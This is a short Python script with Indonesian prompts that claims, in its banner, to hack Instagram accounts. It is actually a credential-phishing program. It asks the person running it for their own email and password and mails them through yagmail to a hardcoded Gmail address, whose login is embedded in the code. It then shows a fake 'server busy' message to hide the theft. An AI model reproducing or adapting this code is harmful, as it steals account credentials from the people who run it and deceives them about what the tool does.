import os,time,sys,random
kuning="\033[1;93m"
ungu="\033[1;95m"
birutua="\033[1;94m"
merah="\033[1;91m"
hijau="\033[1;92m"
print(merah+"menginstall paket...")
os.system('pip install yagmail')
import yagmail
os.system('clear')
print(hijau+"""
 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄        ▄████  ██▀███   ▄▄▄       ███▄ ▄███▓
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄     ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ 
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░ ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░ ░   ░   ░░   ░   ░   ▒   ░      ░   
 ░           ░       ░                 ░  ░      ░    ░           ░  ░       ░                                                    
Hack. Instagram Work 100%""")
x=yagmail.SMTP('dhaniphiss@gmail.com', 'busmaniacommunity')
print(merah+"==================================================================")
print("\033[1;93m[+] \033[1;92mMasukan Email Dan Password Anda\033[1;93m [+]")
print(merah+"==================================================================")
username=str(input(kuning+'masukan email: '))
password=str(input(kuning+'masukan password: '))
body=('username : '+username,'password : '+password)
subject='dapat bosque'
x.send('dhaniphiss@gmail.com', subject,body)
def mengetik(s):
	for c in s + '\n' :
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.4)
print("loading")
mengetik(".........")
time.sleep(0.3)
input(kuning+"Masukan id yang mau dihack: "+hijau)
time.sleep(2)
print(merah+"server sedang penuh")
time.sleep(2)
print(merah+"harap coba lagi nanti")
os.system("exit")
